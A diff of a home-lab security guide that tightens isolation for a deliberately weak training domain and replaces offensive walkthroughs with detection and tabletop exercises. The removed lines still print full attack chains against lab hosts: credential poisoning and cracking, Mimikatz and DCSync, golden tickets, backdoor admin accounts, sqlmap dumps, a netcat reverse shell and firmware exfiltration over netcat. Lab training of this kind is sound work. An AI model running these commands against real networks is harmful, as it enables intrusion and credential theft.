@@ -1088,7 +1088,7 @@ Install-Module -Name Empire -Force
 ```bash
 # Create Windows Server 2019 VM
 qm create 300 --name dc01-target --memory 16384 --cores 4 \
-    --net0 virtio,bridge=vmbr1,tag=30 \
+    --net0 virtio,bridge=vmbr1,tag=30 \\  # vmbr1 must be host-only, with no uplink or route
     --cdrom local:iso/WinServer2019_Eval.iso \
     --scsi0 local-lvm:80 --scsihw virtio-scsi-pci \
     --ostype win10
@@ -1097,7 +1097,7 @@ qm start 300
 ```
 
 > [!CAUTION]
-> The intentionally weak accounts, SMB1 setting, and Defender change below are for a disposable, isolated training domain only. Before enabling them, attach the lab VMs only to a host-only/internal virtual switch, verify there is no bridge, route, NAT, or DNS path to the Internet or production networks, and use test data and credentials only. Never use a production management VLAN for this exercise.
+> The intentionally weak accounts, SMB1 setting, and Defender change below are for a disposable, isolated training domain only. Before enabling them, attach lab VMs only to an internal virtual switch with no physical uplink, default route, NAT, or DNS path to the Internet or production networks. Verify that isolation from the hypervisor console, use test data and credentials only, and administer through the hypervisor console. Never connect this exercise to a production management VLAN.
 
 ```mermaid
 flowchart LR
@@ -1108,10 +1108,10 @@ flowchart LR
     Prod[Production network / Internet] -. no route .- Switch
 ```
 
-**Post-Installation** (use the isolated lab management path only):
+**Post-Installation** (use the hypervisor console; the lab has no default gateway):
 ```powershell
 # Set static IP
-New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.30.30.10 -PrefixLength 24 -DefaultGateway 10.30.30.1
+New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.30.30.10 -PrefixLength 24
 Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.30.30.10
 
 # Rename computer
@@ -1247,327 +1247,63 @@ qm set 330 --name htb-mrrobot --net0 virtio,bridge=vmbr1,tag=30
 
 ## Advanced Lab Scenarios
 
-### Scenario 1: Active Directory Pentesting
+Use these exercises to practice detection, response, and remediation. Keep every target on the isolated virtual switch described above. Use synthetic accounts and data, restore a clean snapshot between exercises, and retain logs needed for review.
 
-**Objective**: Compromise PNWLAB.local domain from external network position
+### Scenario 1: Active Directory Detection
 
-**Starting Point**: Kali VM on Attack VLAN, no credentials
+**Objective:** Identify suspicious authentication and directory-change patterns without collecting credentials or attempting domain compromise.
 
-**Attack Chain**:
-1. **Network Reconnaissance**:
-   ```bash
-   nmap -sn 10.30.30.0/24
-   nmap -sC -sV -p- 10.30.30.10  # DC scan
-   nmap -p 445,139,389,88 10.30.30.0/24  # AD service scan
-   ```
+- Review pre-generated, synthetic security events for repeated authentication failures, unusual service-ticket requests, privileged group changes, and directory replication alerts.
+- Compare account, host, time, and service activity with the lab baseline.
+- Document evidence, likely benign explanations, escalation decisions, and containment steps.
+- Verify least privilege, service-account password strength, pre-authentication settings, and logging coverage through configuration review.
 
-2. **SMB Enumeration**:
-   ```bash
-   enum4linux -a 10.30.30.10
-   smbclient -L //10.30.30.10 -N
-   crackmapexec smb 10.30.30.0/24 --shares
-   ```
+### Scenario 2: Web Application Security Review
 
-3. **LLMNR/NBT-NS Poisoning**:
-   ```bash
-   sudo responder -I eth0 -wv
-   # Wait for captured NTLMv2 hash
-   ```
+**Objective:** Reduce risk in the intentionally vulnerable training application without exposing it to other networks.
 
-4. **Password Cracking**:
-   ```bash
-   # Copy hash to ZimaBoard2 with RTX 3050
-   scp captured.hash user@10.20.20.50:~/
-   
-   # On ZimaBoard2 with GPU:
-   hashcat -m 5600 captured.hash /mnt/pentest-data/wordlists/rockyou.txt
-   ```
+- Review its security configuration and source code in a disposable snapshot.
+- Use synthetic users and records; verify authorization expectations through the application's own safe test suite.
+- Prioritize fixes for access control, injection prevention, secure file handling, request forgery protections, and secret management.
+- Record the fix and confirm it with code review or a non-destructive staging check.
 
-5. **Initial Access**:
-   ```bash
-   crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --shares
-   crackmapexec winrm 10.30.30.0/24 -u jdoe -p 'Password123!'
-   evil-winrm -i 10.30.30.20 -u jdoe -p 'Password123!'
-   ```
+### Scenario 3: Ransomware Readiness Tabletop
 
-6. **Privilege Escalation**:
-   ```powershell
-   # Upload PowerUp
-   upload /opt/PowerUp/PowerUp.ps1
-   . .\PowerUp.ps1
-   Invoke-AllChecks
-   
-   # Or use Bloodhound
-   upload /opt/SharpHound.ps1
-   . .\SharpHound.ps1
-   Invoke-BloodHound -CollectionMethod All
-   ```
+**Objective:** Test backup, alerting, and response decisions without running encrypting software.
 
-7. **Lateral Movement**:
-   ```bash
-   crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --local-auth
-   crackmapexec smb 10.30.30.0/24 -u jdoe -H <ntlm-hash> --lsa
-   ```
+- Use a tabletop timeline and benign sample alerts to simulate suspicious file activity.
+- Confirm responders know how to isolate a VM, preserve evidence, notify owners, and restore a clean snapshot.
+- Verify backup integrity and recovery time using disposable test files.
+- Review whether endpoint and file-server alerts reach the monitoring system.
 
-8. **Domain Admin Compromise**:
-   ```bash
-   # Mimikatz on WKS01 (where DA logged in)
-   crackmapexec smb 10.30.30.20 -u jdoe -p 'Password123!' -M mimikatz
-   
-   # DCSync attack
-   secretsdump.py 'PNWLAB/admin:Admin@123@10.30.30.10'
-   ```
+### Scenario 4: IoT and Embedded Device Segmentation
 
-9. **Persistence**:
-   ```bash
-   # Golden ticket
-   ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain pnwlab.local adminuser
-   
-   # Or create backdoor user
-   net user hacker P@ssw0rd123 /add /domain
-   net group "Domain Admins" hacker /add /domain
-   ```
+**Objective:** Review inventory and containment controls.
 
-**Blue Team Detection**: 
-- Security Onion should alert on Responder traffic
-- Splunk should flag failed authentication attempts
-- Wazuh agents should detect Mimikatz execution
-- OPNsense IDS should trigger on DCSync traffic
+- List only devices intentionally attached to the lab network.
+- Review firmware versions, default-account removal, exposed services, and outbound access policy.
+- Confirm IoT devices cannot reach management interfaces or unrelated lab segments.
+- Document owner, business purpose, supported update path, and retirement plan for each device.
 
-### Scenario 2: External Penetration Test (Web App Focus)
+### Scenario 5: Red and Blue Team Coordination
 
-**Objective**: Compromise DVWA web application and pivot to internal network
+**Objective:** Practice authorization, telemetry review, and incident communication.
 
-**Target**: 10.30.30.72 (DVWA)
+- Agree on written scope, time window, permitted benign test events, contacts, and stop conditions before the exercise.
+- Generate only non-destructive test events in the lab, then confirm that monitoring records and routes them correctly.
+- Have the response team triage, preserve evidence, and explain containment decisions.
+- Hold a debrief and track detection and process improvements.
 
-**Attack Chain**:
-1. **Web Reconnaissance**:
-   ```bash
-   nmap -sV -p 80,443,8080 10.30.30.72
-   nikto -h http://10.30.30.72/dvwa
-   whatweb http://10.30.30.72/dvwa
-   ```
-
-2. **Directory Enumeration**:
-   ```bash
-   gobuster dir -u http://10.30.30.72/dvwa -w /mnt/pentest-data/wordlists/common.txt
-   ffuf -u http://10.30.30.72/dvwa/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
-   ```
-
-3. **Vulnerability Scanning**:
-   ```bash
-   nuclei -u http://10.30.30.72/dvwa -t /opt/nuclei-templates/
-   ```
-
-4. **Manual Testing with Burp Suite**:
-   - SQL Injection
-   - Command Injection
-   - File Upload vulnerabilities
-   - XSS
-
-5. **SQL Injection Exploitation**:
-   ```bash
-   sqlmap -u "http://10.30.30.72/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-       --cookie="PHPSESSID=<session>; security=low" \
-       --dbs --batch
-   
-   # Extract credentials
-   sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
-   ```
-
-6. **Remote Code Execution**:
-   ```bash
-   # Command injection
-   ; nc -e /bin/bash 10.20.20.10 4444
-   
-   # Or file upload webshell
-   # Upload PHP reverse shell
-   ```
-
-7. **Post-Exploitation**:
-   ```bash
-   # Upgrade shell
-   python3 -c 'import pty; pty.spawn("/bin/bash")'
-   
-   # Enumerate system
-   sudo -l
-   cat /etc/passwd
-   find / -perm -4000 2>/dev/null  # SUID binaries
-   
-   # Pivot to internal network
-   ip route
-   for i in {1..254}; do ping -c 1 10.30.30.$i & done
-   ```
-
-8. **Credential Harvesting**:
-   ```bash
-   cat /var/www/html/dvwa/config/config.inc.php  # DB credentials
-   grep -r "password" /var/www/ 2>/dev/null
-   ```
-
-9. **Lateral Movement**:
-   ```bash
-   # Try reused credentials on SMB/SSH
-   crackmapexec ssh 10.30.30.0/24 -u dvwa_user -p 'found_password'
-   ```
-
-**Blue Team Detection**:
-- Nikto/Nuclei scanners should trigger WAF alerts (if deployed)
-- SQLMap traffic should be detected by IDS
-- Reverse shell connection should alert on egress firewall
-- Wazuh should detect file modification (webshell upload)
-
-### Scenario 3: Ransomware Simulation (Isolated VLAN Only)
-
-**CRITICAL**: This is performed in **VLAN 99 - Fully Isolated** network ONLY
-
-**Objective**: Safely test ransomware behavior for blue team training
-
-**Setup**:
-```bash
-# Create isolated Windows targets in VLAN 99
-qm clone 310 400 --name ransomware-target-01
-qm set 400 --net0 virtio,bridge=vmbr1,tag=99
-# Repeat for 3-5 targets
+```mermaid
+flowchart LR
+    Admin[Hypervisor console] --> Lab[Isolated virtual switch]
+    Lab --> DC[Lab directory services]
+    Lab --> Web[Training web application]
+    Lab --> IoT[Disposable IoT target]
+    Lab --> Sensor[Monitoring and synthetic event collector]
+    Sensor --> Team[Detection and response review]
+    Lab -. no route .- Prod[Production / Internet]
 ```
-
-**Red Team**:
-1. Deploy simulated ransomware (Python/PowerShell script that encrypts files but keeps decryption key)
-2. Test initial access vectors: phishing simulation, RDP brute force
-3. Execute payload, monitor encryption process
-4. Test C2 communication (note: no real internet, use local C2 server in VLAN 99)
-
-**Blue Team**:
-1. Monitor with EDR agents (Wazuh, OSSEC)
-2. Detect:
-   - Unusual file access patterns
-   - Mass file modifications
-   - Shadow copy deletion
-   - C2 beaconing
-3. Practice incident response:
-   - Isolate infected hosts
-   - Analyze malware samples
-   - Recover from backups
-   - Hunt for lateral movement
-
-**Tools**:
-```bash
-# Red Team: Ransomware simulator
-python3 /opt/custom/ransim.py --target 10.99.99.0/24 --encrypt-only
-
-# Blue Team: Monitoring
-tail -f /var/log/wazuh/alerts.log | grep -i "ransomware\|file_integrity"
-```
-
-### Scenario 4: IoT/Embedded Device Exploitation
-
-**Objective**: Compromise ZimaBoard target and extract firmware
-
-**Target**: ZimaBoard configured as IoT device (IP: 10.30.30.140)
-
-**Setup on ZimaBoard**:
-- Install minimal Linux (Debian/Ubuntu)
-- Intentionally misconfigure SSH (weak password)
-- Run vulnerable web service (e.g., old version of lighttpd)
-- Enable UART/serial for hardware access
-
-**Attack Chain**:
-1. **Network Discovery**:
-   ```bash
-   nmap -sV -p- 10.30.30.140
-   nmap --script vuln 10.30.30.140
-   ```
-
-2. **Web Exploitation**:
-   ```bash
-   # Scan for CVEs in web server
-   searchsploit lighttpd
-   
-   # Exploit vulnerable service
-   msfconsole
-   use exploit/linux/http/lighttpd_...
-   set RHOST 10.30.30.140
-   exploit
-   ```
-
-3. **SSH Brute Force** (if web exploitation fails):
-   ```bash
-   hydra -l root -P /mnt/pentest-data/wordlists/common-passwords.txt ssh://10.30.30.140
-   ```
-
-4. **Post-Exploitation**:
-   ```bash
-   # Dump firmware
-   dd if=/dev/mmcblk0 of=/tmp/firmware.img bs=1M
-   
-   # Exfiltrate
-   nc 10.20.20.10 4444 < /tmp/firmware.img
-   ```
-
-5. **Firmware Analysis** (on Kali):
-   ```bash
-   binwalk -e firmware.img
-   strings firmware.img | grep -i password
-   firmware-mod-kit/extract-firmware.sh firmware.img
-   ```
-
-6. **Hardware Hacking** (Physical Access):
-   - Connect to UART pins
-   - Use Bus Pirate or similar to access serial console
-   ```bash
-   screen /dev/ttyUSB0 115200
-   # Interrupt boot, gain root shell
-   ```
-
-**Blue Team Detection**:
-- NetAlertX should detect new device on network
-- OPNsense should log brute force attempts
-- Security Onion should flag exploitation traffic
-- Host-based detection if Wazuh agent installed on IoT device
-
-### Scenario 5: Red Team vs. Blue Team Exercise
-
-**Format**: Live purple teaming exercise
-
-**Red Team Objective**: Achieve domain admin within 4 hours
-**Blue Team Objective**: Detect and contain attack before DA compromise
-
-**Setup**:
-- Red Team: Kali VM (Attack VLAN)
-- Blue Team: Security Onion, Splunk dashboards (Blue Team VLAN)
-- Targets: Full AD environment (Target VLAN)
-
-**Rules of Engagement**:
-1. Red Team must document all commands
-2. Blue Team documents all detections
-3. Communication channel for "pause" during detection discussion
-4. Debrief after exercise to improve both sides
-
-**Red Team Kill Chain**:
-```
-Reconnaissance → Initial Access → Privilege Escalation → 
-Lateral Movement → Domain Dominance → Persistence
-```
-
-**Blue Team Detection Points**:
-1. Initial scan detection (Suricata)
-2. Responder/LLMNR poisoning (network anomaly)
-3. Failed authentication attempts (Windows logs)
-4. PowerShell Empire/Cobalt Strike beacons (EDR)
-5. Mimikatz execution (YARA rules, process monitoring)
-6. DCSync traffic (abnormal replication)
-
-**Scoring**:
-- Red Team: Points for each phase achieved undetected
-- Blue Team: Points for each detection + containment action
-
-**Post-Exercise Analysis**:
-- Review all logs in Splunk
-- Map to MITRE ATT&CK framework
-- Improve detection rules
-- Identify gaps in monitoring
-
----
 
 ## Tool Arsenal Integration
 
